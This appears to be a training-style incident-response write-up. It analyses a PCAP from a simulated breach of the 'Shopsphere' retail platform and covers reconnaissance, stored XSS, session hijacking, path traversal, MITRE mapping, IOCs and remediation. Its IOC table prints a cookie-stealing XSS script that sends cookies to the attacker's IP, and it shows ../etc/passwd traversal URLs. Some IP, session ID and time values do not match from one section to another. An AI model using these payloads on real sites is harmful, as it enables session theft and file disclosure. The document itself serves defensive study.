# Shopsphere-retail-breach-investigation

# Executive Summury :

On 29 March 2024 at approximately 12:09 UTC, the Shopsphere platform experienced a security incident involving unauthorized access through website vulnerabilities. The attacker exploited weaknesses that allowed them to steal the administrator session, potentially granting full administrative privileges.

The incident placed user data, orders and system logs at risk of exposure. Additionally, the attacker accessed a sensitive system file, indicating an attempt to escalate privileges and gain deeper control of the system .

Immediat remediation actions are necessary to contain the incident including:

* Blocking the attacker’s access  
* Resetting the administrator sessions and credentials  
* Reviewing system logs to assess the full impact  
* Patching the identified vulnerabilities  
* Conducting full investigation of the system to prevent similar incidents from happening in the future

# Initial Findings

* Shopsphere retail platform has been hacked  
* Administration cookie session was stolen  
* Attacker accessed /etc/passwd file system  
* IP server: 73.124.17.52  
* IP attacker: 111.224.180.128

---
## Tools:

- Tshark  
- Suricata  
- Sigma  
- WAF  
- VirusTotal

---
# Tasks

## 1. Full attack chain

### 1.1 Reconnaissance :

The analysis of the PCAP using tshark revealed:

* Multiple GET requests within a short time, more than 11 requests per second  
* Repetitive GET requests resulting in 404 not found responses per second  
* The use of Gobuster/3.6 as a User-Agent 
 These findings are a strong indicator of active reconnaissance using automated tool Gobuster.
Gobuster: designed for penetration testers, security professionals, and forensics experts to perform security assessments and reconnaissance.

<br><img width="945" height="466" alt="image" src="https://github.com/user-attachments/assets/386fcacf-666b-414d-bcf2-a69d1a2cba24" /><br>

<br><img width="945" height="730" alt="image" src="https://github.com/user-attachments/assets/a65a8b18-09a2-4494-816d-8f21a0727906" /><br>

<br><img width="945" height="970" alt="image" src="https://github.com/user-attachments/assets/ce36297b-0e93-4c5f-8cf9-be6f3df706a9" /><br>

### 1.2. XSS (Cross-Site Scripting) :

#### 1.2.1.What is XSS?

Is a vulnerability in web application that allows a third party to execute a script in the user’s browser on behalf of the web application.

#### 1.2.2.XSS identification:

At approximately 12:09:50 UTC on 29 March 2024, the frame number 10060 shows that the attacker 111.224.18.128 injected an obfuscated script designed to steal session cookies of any user visiting the /reviews.php page. Additionally, the presence of curl/8.5.0 User-Agent indicates that the request was made using command line tool instead of web browser, confirming scripted activity.
<br><img width="945" height="78" alt="image" src="https://github.com/user-attachments/assets/ef29b067-4683-419a-88db-a071d073dc96" /><br>

<br><img width="945" height="95" alt="image" src="https://github.com/user-attachments/assets/006e0e54-3f59-4555-acaf-69505f960a72" /><br>

<br><img width="945" height="330" alt="image" src="https://github.com/user-attachments/assets/b442c971-9774-4494-b63d-520a3b388b7d" /><br>

<br><img width="945" height="587" alt="image" src="https://github.com/user-attachments/assets/7128eb42-9f24-4734-ac6a-bcdfc3fea2c8" /><br>

<br><img width="983" height="545" alt="image" src="https://github.com/user-attachments/assets/40d7f7ef-4fdb-4d32-8b29-3cc27ba165e6" /><br>

### 1.3. Session hijacking:

#### 1.3.1.What is session hijacking?

Is a cyber-attack method where adversaries intercept or steal valid session tokens like cookies or authentication IDs to impersonate legitimate users and gain unauthorized access to systems, applications or data.

#### 1.3.2.Session hijacking identification :

At approximately 12:09:51 UTC on 29 March 2024, the frame number 10116 indicates that the attacker requested the /admin path while including the administrator session ID qkctf24s9h9lg67teu8uevn3q.

<img width="945" height="634" alt="image" src="https://github.com/user-attachments/assets/c8e5bcbf-cc35-48ea-b49c-b2b7320808d8" /><br>

<br><img width="945" height="327" alt="image" src="https://github.com/user-attachments/assets/ecd6b06b-49ed-47a1-8f2b-1dae72b767ca" /><br>

### 1.4.Path traversal:

#### 1.4.1.What is path traversal?

A directory traversal attack occurs when an attacker manipulates file paths in a way that allows them to access directories and files, they shouldn't be able to. This is often possible due to insufficient input validation and sanitization when user input is used to construct file paths for file operations like open, read, and write.

Consider a simple file retrieval feature in a web application that allows users to view files by specifying a filename in a query parameter, like so: `http://example.com/getFile?filename=report.txt`

An attacker can exploit this feature by requesting a file outside the intended directory with a request like:`http://example.com/getFile?filename=../../../../etc/passwd` aiming to access the system's password file.

### 1.4.2.Path traversal identification:

At approximately 12:09:54 UTC on 29 March 2024, the frame number 10156 indicates that the attacker used path a traversal technique to request the /etc/passwd/ directory, a Linux system file that contains information about users such as usernames, user IDs (UIDs), group IDs (GIDs), home directories, and login shells.

<img width="945" height="159" alt="image" src="https://github.com/user-attachments/assets/74c32e44-eefe-4c02-a36d-f40c82d50c4e" /><br>

<br><img width="945" height="328" alt="image" src="https://github.com/user-attachments/assets/d6085342-9478-4870-b225-133aabc8eaf5" /><br>

### 1.5.Attack attack chain:

| Chain 1  | Chain 2        | Chain 3        | Chain 4        |
|----------|----------------|----------------|----------------|
| Attack   | Reconnaissance | XSS            | Session hijacking | Path traversal |
| Timeline | 12:09:37 UTC   | 12:09:50 UTC   | 12:09:51 UTC   | 12:09:54 UTC   |

### 1.6.Forensic method explanation:

**tshark:** network protocol analyzer allows to capture packet data from live network or read packets from previously saved capture file.

- -r: to read data from the file  
- -x: to print hex and ASCII dump of the packet data  
- -V: to print a view of the packet detail  
- -Y: to read and display filter

# 2.MITRE ATT&CK TTP mapping:

| Action              | Tactic              | Technique                            | Justification |
|--------------------|---------------------|--------------------------------------|----------------|
| Reconnaissance     | Reconnaissance      | T1595 - Active Scanning             | The attacker directly interacted with the target through network traffic by enumerating files and directories to gather information that could be used for further targeting. |
| Reconnaissance     | Discovery           | T1083 - File and Directory Discovery | The attacker performed file and directory enumeration to identify accessible resources. |
| XSS                | Initial Access      | T1189 - Drive-by Compromise         | The attacker injected an obfuscated JavaScript payload into the /reviews endpoint, designed to execute when users visited the page. |
| Session Hijacking  | Credential Access   | T1539 - Steal Web Session Cookie    | The attacker stole the administrator session cookie after visiting the /reviews page and used it to access the Shopsphere application as an administrator without credentials. |
| Path Traversal     | Discovery           | T1083 - File and Directory Discovery | The adversary requested the sensitive /etc/passwd file via the vulnerable log_reviews.php endpoint by manipulating the query parameter, indicating an attempt to enumerate sensitive system files. |

## 2.1.Mitre attack packet evidence:

<br><img width="945" height="180" alt="image" src="https://github.com/user-attachments/assets/7d644d47-b0c5-46e2-87d3-ae1e0d998d9a" /><br>

<br><img width="945" height="23" alt="image" src="https://github.com/user-attachments/assets/f5f85c2b-91a5-4b02-a0f3-9ee681114eab" /><br>

<br><img width="945" height="32" alt="image" src="https://github.com/user-attachments/assets/6d02b55a-a6bb-4363-b5c5-6423b0bf77b4" /><br>

<br><img width="945" height="28" alt="image" src="https://github.com/user-attachments/assets/8b3cbb57-4859-47df-9a85-fb49d012d878" /><br>

## 3.Attacker infrastructure analysis:

Beyond IP geolocation and based on previous analysis (full chain reconstruction part), the PCAP indicates that the attacker is using an automated attack setup.

The presence of the Gobuster tool suggests automated directory enumeration. The exploitation of multiple vulnerabilities including XSS, session hijacking and path traversal within only 4 seconds (from 14:09:50 to 14:09:54) indicates an automated attack chain rather than interactive human activity.

Additionally, the presence of multiple requests within the same second further supports the use of an automated framework or script to perform the full sequence.

## 4.Victim Impact assessment:

According to the stored XSS payload, the attacker targeted users visiting the /reviews.php page. In this case, the administrator is the first who visited the page after payload is injected.

Gaining administrative privileges could lead to full compromise of the web application, including the exposure of user data, modification of orders, access to logs and potentially affecting the whole system.

<br><img width="945" height="466" alt="image" src="https://github.com/user-attachments/assets/56f17d0b-2dc0-46b8-a73a-31dc28e37fc8" /><br>

<br><img width="945" height="359" alt="image" src="https://github.com/user-attachments/assets/16ff2df1-7215-4437-91b7-491d457c7773" /><br>

## 5.Threat actor hypothesis:

Based on PCAP file evidence:

* The attacker is likely of an intermediate skill level, as they use automated tools to execute the full attack chain, demonstrate an understanding of web vulnerabilities (reconnaissance, XSS, session hijacking, path traversal) and are able to chain them effectively.  

* The attacker objective appears to be full compromise of the server, as indicated by the attempt to access the sensitive file /etc/passwd after gaining initial access.  

* The next step is likely to escalate privilege to root and achieve full control of the server.  

## 6.Full detection engineering package:

Detection engineering is about developing and building detection rules to identify malicious activities across multiple layers.

Based on the attack chain, I used:

* Suricata to detect directory enumeration, suspicious user-agent such as Gobuster and curl, abnormal traffic pattern and path traversal to access /etc/passwd.  
* Sigma to detect directory enumeration by inspecting user-agent and counting GET requests from a unique source.  
* WAF to detect and block malicious javascript payload by inspecting POST body such as <script> tag.

## 6.1.Network level: Suricata rules

 <br><img width="945" height="477" alt="image" src="https://github.com/user-attachments/assets/18ce92a3-07d7-4d31-b3d4-560a23ec1d95" /><br>

## 6.2. SIEM: Sigma rule:

<br><img width="945" height="454" alt="image" src="https://github.com/user-attachments/assets/39b4c7dd-a526-4ea5-a98d-f5f5b3ba8450" /><br>

## 6.3. Application level: WAF rule:

<br><img width="945" height="254" alt="image" src="https://github.com/user-attachments/assets/22496714-eb07-48b8-b55f-40f666e221b0" /><br>

## 7.Forensic gap analysis:

The PCAP file allows the investigation and detection of attack chains from recon to path traversal but cannot provide further information about actions taken by the attacker after the frame number 10156 such as lateral movement, privilege escalation and data exfiltration.

## Gap analysis

| Gap analysis            | Data source          | Investigation |
|------------------------|----------------------|----------------|
| Data exfiltration      | SIEM                 | - Monitor large outbound data transfer<br>- Monitor outbound connections to foreign addresses |
| Privilege escalation   | Server logs, EDR     | - Check login connection from admin account<br>- Check requests to /admin endpoint after frame 10156<br>- Check login attempts outside normal login time<br>- Monitor unusual activities such as task schedule or malicious process in real time |
| Database exploitation  | Database Logs        | - Search for keywords such as SELECT, UNION and INSERT<br>- Check any special characters such as ' and dashes (--)<br>- Check for automated user-agent<br>- Check payload content such as 1=1 |

## 8.Victim detail:

The victim has the following information:

* IP address: 73.124.17.52  
* MAC address: 00:1a:2b:3c:4d:5e  
* Role: server  
* User: administrator account

 ## 9.IOC: 

| Type        | Value | Description |
|------------|-------|-------------|
| IP address  | 111.224.180.128 | Attacker IP |
| User-Agent  | Gobuster/3.6 | Suspicious user agent used for directory and file enumeration |
| User-Agent  | Curl /8.5.0 | Suspicious user agent used to post malicious script |
| Account     | admin | Compromised account |
| Session ID  | lqkctf24s9h9lg67teu8uevn3q | Session ID stolen by the attacker |
| Port        | 80 | HTTP port |
| URL | http://shopsphere.local/reviews.php | Vulnerable endpoint used to inject malicious JavaScript code |
| URL | http://shopsphere.local/log_viewer.php?file=access.log | Vulnerable endpoint used to access system log |
| URL | http://shopsphere.local/log_viewer.php?file=../../../../../etc/passwd | Vulnerable endpoint used to access /etc/passwd system file |
| URL | http://shopsphere.local/pad-after-xss-10069 | Endpoint used for enumeration attempts after XSS |
| URL | http://shopsphere.local/pad-after-xss-10079 | Endpoint used for enumeration attempts after XSS |
| URL | http://shopsphere.local/pad-after-xss-10089 | Endpoint used for enumeration attempts after XSS |
| Script | `<script>fetch('http://111.224.180.128/' + document.cookie);</script>` | Malicious script injected into /reviews.php endpoint |

## 10.Virustotal graph:

While the attacker IP 111.224.180.128 was not flagged by any security vendors, it was still used for malicious purposes.

<br><img width="945" height="451" alt="image" src="https://github.com/user-attachments/assets/d8eedfe3-62a1-48ad-8ecd-43d22a02fe39" /><br>

## 11.Evidence integrity chain:

**Chain of Custody (CoC):** is the documented trail that tracks a piece of evidence from the moment it’s collected at a crime scene to the moment it’s presented in court (what was collected, when, where, by whom, and how it was handled).

| Evidence ID | Source | Evidence type | Analyst | Location | Time | Description |
|------------|--------|---------------|----------|----------|------|-------------|
| EVD-001 | Network Packet analyzer | PCAP | Emna | The PCAP is received from a trusted source | 09 May 2026 | - The PCAP file is handled in read only mode.<br>- The investigation was performed using the Tshark command and this |

The PCAP file is admissible as evidence because it enables the reconstruction of the attack timeline and the entire attack chain, traces the attacker’s activities and helps identify and collect IOCs.

## 12.Knowledge Graph (KG):

<br><img width="945" height="1039" alt="image" src="https://github.com/user-attachments/assets/1f509f51-8ef9-4aca-ac8a-52cfa693ec58" /><br>

## 13.Remediation roadmap:

| Severity | Owner | Remediation | Time | Metric success | Forensic verification |
|----------|-------|-------------|------|----------------|------------------------|
| Critical | Developer | Patch XSS vulnerability in the /reviews page (input validation, encoding output data) | 24 hours | No <script> payload in POST body | WAF |
| Critical | Network engineer | Block the attacker IP and suspicious user agents | Immediate | The attacker cannot access the network | Firewall |
| Critical | System administrator | Reset administrator sessions and credentials | Immediate | No reuse of stolen sessions | Webserver logs |
| High | Developer | Patch path traversal vulnerability on /log_viewer page | 24 hours | No access to /etc/passwd | Webserver logs |
| High | Security team | Perform a full server investigation for further attacks | 48 hours | - | - |
| Medium | Security team | Apply secure cookies (HTTPOnly, SameSite)<br>Implement 2FA<br>Enforce HTTPS encryption | 3–5 days | Reduced session hijacking risk | Webserver logs |
| Medium | Security team | Perform a full vulnerability scanning | 2 weeks | No critical/high vulnerabilities detected | Scan reports |

## Conclusion:

The investigation revealed that the Shopsphere retail platform was compromised through web vulnerabilities. The exploitation of the XSS vulnerabilities allowed the attacker to steal the administrator session placing sensitive data at risk.

Additionally, the attacker successfully accessed the content of sensitive file system through path traversal exploitation.

Immediate mitigation actions are required to contain the incident, remediate the identified vulnerabilities and prevent further compromise.



